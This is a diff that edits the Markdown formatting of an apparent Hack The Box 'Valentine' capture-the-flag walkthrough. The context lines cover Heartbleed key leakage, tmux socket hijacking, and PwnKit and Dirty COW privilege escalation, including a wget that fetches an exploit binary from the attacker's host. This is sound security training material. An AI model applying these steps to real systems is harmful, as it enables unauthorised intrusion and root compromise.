@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Valentine.png
+![Valentine.png](../assets/valentine_assets/Valentine.png)
 
 ### Enumeration
 
@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds
 
 Ok cool, just three open ports here. Navigating to the site we find just a simple image, with no links or functionality:
 
-site.png
+![site.png](../assets/valentine_assets/site.png)
 
 I'll get things started by running an Nmap vuln scan against the site, to see if it can find any vulnerabilities while we manually enumerate:
 
@@ -70,25 +70,25 @@ I'll get things started by running an Nmap vuln scan against the site, to see if
 └─$ sudo nmap --script vuln 10.10.10.79
 ```
 
-While Nmap runs lets Kick off some directory fuzzing, we find a couple of interesting directories.
+While Nmap runs lets Kick off some directory fuzzing. Cool, we found a couple of interesting directories.
 
-ferox.png
+![ferox.png](../assets/valentine_assets/ferox.png)
 
 Most interesting off the bat is the `/dev` directory, which is hosting 2 files:
 
-dev.png
+![dev.png](../assets/valentine_assets/dev.png)
 
 Checking out the hype_key file, we see what appears to be a bunch of hex encoding:
 
-hype_key.png
+![hype_key.png](../assets/valentine_assets/hype_key.png)
 
 whereas the notes.txt file appears to be some personal developer notes:
 
-notes.txt
+![notes.txt](../assets/valentine_assets/notes.txt)
 
 This note also refers to the `/encode` directory which we also found with Feroxbuster. 
 
-encoder.png
+![encoder.png](../assets/valentine_assets/encoder.png)
 
 Here there is also a link to the `/decode` directory.
 
@@ -96,17 +96,19 @@ Lets keep those directories in mind for now and focus on the hex encoding on the
 
 If we paste the hex into CyberChef at https://gchq.github.io/CyberChef/ we see that this was an encoded private SSH key!
 
+![private.png](../assets/valentine_assets/private.png)
+
 Lets add that to a file and try to SSH in as user hype:
 
-key_try.png
+![key_try.png](../assets/valentine_assets/key_try.png)
 
 Ok rats, looks like the key is passphrase protected/ and is still prompting for a password. Trying to use ssh2john didn't work here, so we must be missing some more info somewhere
 
-john_fail.png
+![john_fail.png](../assets/valentine_assets/john_fail.png)
 
 Going back to our Nmap vuln scan we find a pleasant surprise:
 
-nmap.png
+![nmap.png](../assets/valentine_assets/nmap.png)
 
 Cool! Looks like we've found a Heartbleed vulnerability! Here is a great writeup of the vulnerability:
 
@@ -130,9 +132,9 @@ With `-p` to declare the port number we're attacking and `-n` to declare the num
 
 Nice, looks like we've found some encoded text!
 
-exploit.png
+![exploit.png](../assets/valentine_assets/exploit.png)
 
-We can decode that in there terminal:
+We can decode that in the terminal:
 
 ```text
 ┌──(ryan㉿kali)-[~/HTB/Valentine]
@@ -164,13 +166,13 @@ Note: due to the age of the box I had to use the `-o PubkeyAcceptedKeyTypes=+ssh
 
 We can now grab the user.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/valentine_assets/user_flag.png)
 
 ### Privilege Escalation #1
 
 To help with privilege escalation I'll go ahead and transfer over LinPeas to the target:
 
-lp.png
+![lp.png](../assets/valentine_assets/lp.png)
 
 Looking at running processes, LinPeas finds a tmux session running as root. Interesting!
 
@@ -184,15 +186,15 @@ hype@Valentine:/tmp$  /usr/bin/tmux -S /.devs/dev_sess
 ```
 And we a dropped into root's tmux session where we can grab the root.txt flag:
 
-root_flag.png
+![root_flag.png](../assets/valentine_assets/root_flag.png)
 
 ### Privilege Escalation #2
 
-Because this is such an old box there are likely several different ways to escalate privileges, but I'll also showcase just a couple more here, just for fun. 
+Because this is such an old box there are likely several different ways to escalate privileges, but I'll showcase just a couple more here, just for fun. 
 
 LinPeas also discovered this target is vulnerable to CVE-2021-4034, which can be exploited with PwnKit:
 
-pwnkit.png
+![pwnkit.png](../assets/valentine_assets/pwnkit.png)
 
 ```text
 hype@Valentine:/tmp$ wget http://10.10.14.40/PwnKit
@@ -218,11 +220,11 @@ uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambash
 
 The last privesc I'll show here is the classic kernel exploit dirty cow. A nice high level summary of the exploit can be found at https://dirtycow.ninja/
 
-LinPeas to save the day once again finds that the target is 'highly probable' to be vulnerable to dirty cow:
+LinPeas to save the day once again finds that it is 'highly probable' the target is vulnerable to dirty cow:
 
-dc.png
+![dc.png](../assets/valentine_assets/dc.png)
 
-This exploit creates a new user firefart (such a beautiful name..) with root permissions. All we need to do is create a password (here I just used the password `pass`) for the new root user and issue `su - firefart` and we get root access to the box. We can exploit it with:
+This exploit creates a new user firefart (such a beautiful, poetic name...) with root permissions. All we need to do is create a password (here I just used the password `pass`) for the new root user and issue `su - firefart` and we get root access to the box. We can exploit it with:
 
 ```text
 hype@Valentine:/tmp$ whoami
